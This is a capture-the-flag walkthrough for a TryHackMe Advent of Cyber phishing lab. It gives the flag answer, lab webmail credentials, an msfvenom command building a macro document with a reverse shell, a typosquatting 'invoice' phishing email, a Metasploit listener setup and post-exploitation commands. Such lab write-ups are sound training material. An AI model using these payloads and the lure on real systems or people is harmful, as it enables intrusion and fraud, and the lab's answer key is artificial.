@@ -1,0 +1,134 @@
+What is the flag value inside the flag.txt file that’s located on the Administrator’s desktop?
+
+Answer : THM{PHISHING_CHRISTMAS}
+
+
+---
+
+# 🎄 Advent of Cyber: Day 10 – Malicious Document & Reverse Shell Walkthrough
+
+**Challenge Title:** *Mayor Malware’s Mischief*  
+**Challenge Focus:** Phishing & Payload Delivery (Macro-enabled document with reverse shell)
+
+---
+
+## 🧠 Objective
+
+- Craft a `.docm` payload with `msfvenom`
+- Host a phishing campaign via typosquatting email
+- Attach and send payload to target user
+- Receive reverse shell using `meterpreter`
+- Locate and exfiltrate the flag
+
+---
+
+## ⚙️ Tools & Environment
+
+| Tool/Platform      | Usage                                      |
+|--------------------|--------------------------------------------|
+| Metasploit         | Payload generation and shell listener      |
+| Firefox (AttackBox)| Typosquatting webmail interaction          |
+| Linux Terminal     | File creation, shell handling              |
+| TryHackMe AttackBox| Simulated victim machine and infrastructure|
+
+---
+
+## 📦 Step 1: Generate Malicious Document
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=10.10.146.146 LPORT=4444 \
+  -f docm \
+  -o /root/.msf4/local/msf.docm
+```
+
+💡 *Note: Create `/root/.msf4/local/` if missing.*
+
+---
+
+## 📧 Step 2: Send Phishing Email
+
+### Login Details:
+- URL: `http://10.10.146.146`
+- Email: `info@socnas.thm`
+- Password: `MerryPhishMas!`
+
+### Email Composition:
+- **Recipient:** `marta@socmas.thm`
+- **Subject:** `Invoice for December`
+
+### Message Body:
+```text
+Hi Marta,
+
+Please find the Q4 invoice attached. Let me know if it looks okay before processing. The breakdown is inside the document.
+
+Regards,  
+Accounts Dept  
+socnas.thm
+```
+
+💡 *Use CTRL+H to access the hidden `.msf4` directory during attachment.*
+
+---
+
+## 🛰️ Step 3: Setup Listener
+
+```bash
+msfconsole
+```
+
+Inside Metasploit:
+
+```bash
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.10.146.146
+set LPORT 4444
+run
+```
+
+---
+
+## 🛬 Step 4: Post-Exploitation & Flag Hunting
+
+After shell connects:
+
+```bash
+getuid           # Confirm access level
+sysinfo          # Grab victim info
+getenv USERNAME  # Reveal logged-in user
+```
+
+### Navigate to Desktop:
+
+```bash
+cd C:\\Users\\Administrator\\Desktop
+ls
+cat flag.txt
+```
+
+*Common mistake:* Using `User` instead of `Users` in path:
+```bash
+cd C:\\User\\...    ❌  [Incorrect]
+cd C:\\Users\\...   ✅  [Correct]
+```
+
+---
+
+## 🧾 Summary
+
+- ✅ Delivered reverse shell via `.docm`
+- ✅ Used typosquatting to socially engineer trust
+- ✅ Navigated to victim desktop
+- ✅ Retrieved `flag.txt` via meterpreter
+
+---
+
+## 🚀 Notes for SOC Analysts
+
+- Typosquatting is highly effective in corporate phishing.
+- `.docm` payloads bypass naive email scanners.
+- Always confirm target username with `getenv USERNAME`.
+
+---
